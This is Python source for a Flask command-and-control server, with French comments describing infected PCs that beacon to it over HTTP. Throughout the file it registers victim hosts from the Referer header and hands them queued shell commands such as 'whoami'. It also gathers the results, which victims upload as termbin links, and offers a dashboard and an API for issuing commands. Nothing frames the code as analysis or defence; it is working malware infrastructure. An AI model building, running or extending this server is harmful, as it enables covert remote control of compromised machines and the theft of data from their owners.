#!/usr/bin/env python3

from flask import Flask, request, render_template, jsonify
from flask_cors import CORS

import requests
from hashlib import md5

# custom sqlite db methods
import db

app = Flask(__name__)

CORS(app, resources={r'/*': {'origins': '*'}})

"""
	> Un pc infecté envoie à interval régulier
		une requête HTTP vers le C2
		contenant les headers Referer et Cache-Control.

	[ Phase 1 ]
	> Il faut extraire le hostname depuis l'entête Referer


"""




# execute all together
# ===============================================
def main():
	database = r"c2.db"

	# create tables
	'''
	sql_create_hosts = """
		CREATE TABLE IF NOT EXISTS hosts (
			host_id INTEGER NOT NULL PRIMARY KEY,
			hostname TEXT NOT NULL
		);
	"""

	sql_create_cmdhistory = """
		CREATE TABLE IF NOT EXISTS commands (
			command_id INTEGER NOT NULL PRIMARY KEY,
			command TEXT NOT NULL,
			status INTEGER NULL,
			answer TEXT NULL,
			fk_host_id INTEGER NOT NULL,
			FOREIGN KEY (fk_host_id) REFERENCES hosts(host_id)
		);
	"""

	# create db conn
	conn = create_connection(database)

	# create tables
	if conn is not None:
		create_table(conn, sql_create_hosts)
		create_table(conn, sql_create_cmdhistory)
	else:
		print("Error! cannot create the database connection")
	'''

	conn = db.create_connection(database)
	with conn:
		'''
		hostname = ['super-pc']
		host_id = insert_host(conn, hostname)
		command = ('whoami', host_id)
		command_id = insert_new_command(conn, command)
		print(">success>")
		'''
		updatecmd = (1, "desktop-jc32", 1)
		req_updatecmd = update_command_status(conn, updatecmd)
		print("ok")

# ===============================================


# test database
# ===============================================
@app.route("/db")
def testdb():
	main()

	return "ok"
# ===============================================
















# ===============================================
# APP-RELATED FUNCTIONS
# ===============================================


# insert new host
# ===============================================
def insert_host(conn, hostname, ip):
	sql = 'INSERT INTO hosts(hostname, ip, hash) VALUES (?, ?, ?)'
	lastrowid = db.insert_db(conn, sql, (hostname, ip, md5((hostname+ip).encode('utf-8')).hexdigest()))

	return lastrowid
# ===============================================






@app.route("/")
def phase1():
	ip = request.remote_addr

	# print(request.headers.get("Referer"))
	referrer = request.referrer

	if referrer == None:
		return ""

	# remove the "host:" prefix + pop the "-00" and get core hostname
	hostname = referrer.split(':')[1].split('-')
	hostname.pop(-1)
	hostname = "-".join(hostname)
	print("\n\n== welcome %s ==" % (hostname))

	# get db connection
	conn = db.get_db()


	# check if hostname exists in db
	# sample : [[1, 'DESKTOP-AB123', 'bc60fa448aab00f893d746b9190e2ae0', 'windows', '127.0.0.1']]
	host = (db.get_one_host(hostname)).get_json()

	if host:
		print("[i] host already here")
	else:
		print("[!] no host %s registered !" % (hostname))
		latest_id = insert_host(conn, hostname, ip)
		if latest_id != None:
			print("[+] new host '%s(%s)' added to database with id=%s! " % (hostname, ip, latest_id))


	# check if command to give to host
	# host_hash = md5((hostname+ip).encode('utf-8')).hexdigest()

	latest_cmd_for_host = (db.get_last_cmd_for_host(hostname)).get_json()

	if (len(latest_cmd_for_host) == 0):
		return ''

	return "123--%s--%s" % (hostname, latest_cmd_for_host[0][0])

# ===============================================



# ===============================================
@app.route("/dashboard")
def dashboard():
	return render_template('dashboard.html')
# ===============================================


# ===============================================
@app.route("/api/hosts/list")
def api_hosts_list():
	hosts = db.api_get_hosts()
	return hosts
# ===============================================


# ===============================================
@app.route("/api/commands/list", methods=['GET'])
def api_commands_list():
	host_id = request.args.get('host_id')
	commands = db.api_get_command(host_id)
	return commands
# ===============================================


# ===============================================
@app.route("/api/commands/add", methods=['POST'])
def api_commands_add():
	params = request.get_json()
	success = db.api_add_command(params[0], params[1])
	return success
# ===============================================


# endpoint pour recueillir les liens termbin 
# avec la réponse de la commande précédemment exécutée
# ===============================================
@app.route("/answer")
def answer():
	# on recupere hostname + lien termbin via le header Referer
	referrer = request.referrer

	if referrer == None:
		return ""

	full_referrer = referrer.split(' -- ')

	host = (full_referrer[0]).split(":")[1].split("-00")[0]
	termbin_url = full_referrer[1]

	# print("host : " + host)
	# print("termbin_url : " + termbin_url)

	success = db.api_add_answer(host, termbin_url)

	return success
# ===============================================

